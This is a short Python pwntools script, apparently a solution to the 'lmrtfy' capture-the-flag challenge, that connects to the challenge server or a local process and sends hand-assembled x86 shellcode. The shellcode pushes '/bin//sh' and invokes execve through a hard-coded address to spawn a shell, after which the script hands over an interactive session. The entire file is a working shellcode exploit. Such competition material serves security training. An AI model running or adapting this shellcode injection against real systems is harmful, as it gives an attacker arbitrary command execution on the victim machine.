#!/usr/bin/env python3
from pwn import *

bin_name = "./lmrtfy"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("lmrtfy.challs.cyberchallenge.it", 9124)
    else:
        return process(elf.path)

def main():
    r = conn()

    r.recv()
    payload = asm('''
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        mov ecx, eax
        mov edx, eax
        mov eax, 11
        mov esi, 0x08049444
        call esi
    ''')

    r.send(payload)
    r.interactive()

if __name__ == "__main__":
    main()
